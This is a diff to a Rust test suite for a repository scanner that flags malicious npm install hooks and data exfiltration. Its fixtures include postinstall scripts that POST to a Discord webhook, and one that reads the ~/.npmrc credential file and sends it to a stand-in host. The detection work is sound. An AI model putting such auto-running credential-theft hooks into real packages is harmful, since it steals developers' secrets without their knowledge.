@@ -17,6 +17,7 @@ use anthology_scan::{Finding, Scan, Severity, scan};
 const DISCORD: &str = concat!("https://disc", "ord.com/api/webh", "ooks/1/example");
 const SKIP_PERMS: &str = concat!("--dangerously-", "skip-permissions");
 const ENV_DUMP: &str = concat!("JSON.stringify(process", ".env)");
+const NPMRC: &str = concat!("~/.np", "mrc");
 
 /// A fixture tree in a temp folder.
 struct Repo {
@@ -571,6 +572,57 @@ fn a19_webhook_in_index_js() {
     let s = repo.scan();
     expect(&s, "exfil.webhook", "index.js", Severity::High);
     expect_exit(&s, 1);
+}
+
+#[test]
+fn a19_a_postinstall_that_runs_a_file_with_a_lone_chat_webhook_is_critical() {
+    let repo = Repo::new();
+    repo.file(
+        "package.json",
+        r#"{ "name": "demo-lib", "version": "1.0.0", "scripts": { "postinstall": "node hook.js" } }"#,
+    );
+    repo.file(
+        "hook.js",
+        format!("fetch(\"{DISCORD}\", {{ method: \"POST\", body: \"installed\" }});\n"),
+    );
+    let s = repo.scan();
+    expect(&s, "exfil.webhook", "hook.js", Severity::High);
+    expect(
+        &s,
+        "autorun.npm-lifecycle",
+        "package.json",
+        Severity::Critical,
+    );
+    expect_exit(&s, 2);
+}
+
+#[test]
+fn a_test_folder_script_is_medium_alone_and_critical_when_a_postinstall_runs_it() {
+    let read_and_post = format!(
+        "const k = require(\"fs\").readFileSync(\"{NPMRC}\");\nfetch(\"https://example.invalid/up\", {{ method: \"POST\", body: k }});\n"
+    );
+    // On its own the test-path cap holds.
+    let repo = Repo::new();
+    repo.file("test/x.js", read_and_post.clone());
+    let s = repo.scan();
+    expect(&s, "exfil.cred-path", "test/x.js", Severity::Medium);
+    expect_exit(&s, 0);
+    // A postinstall that runs it takes the cap off.
+    let repo = Repo::new();
+    repo.file(
+        "package.json",
+        r#"{ "name": "demo-lib", "version": "1.0.0", "scripts": { "postinstall": "node test/x.js" } }"#,
+    );
+    repo.file("test/x.js", read_and_post);
+    let s = repo.scan();
+    expect(&s, "exfil.cred-path", "test/x.js", Severity::High);
+    expect(
+        &s,
+        "autorun.npm-lifecycle",
+        "package.json",
+        Severity::Critical,
+    );
+    expect_exit(&s, 2);
 }
 
 fn jar_bytes() -> Vec<u8> {
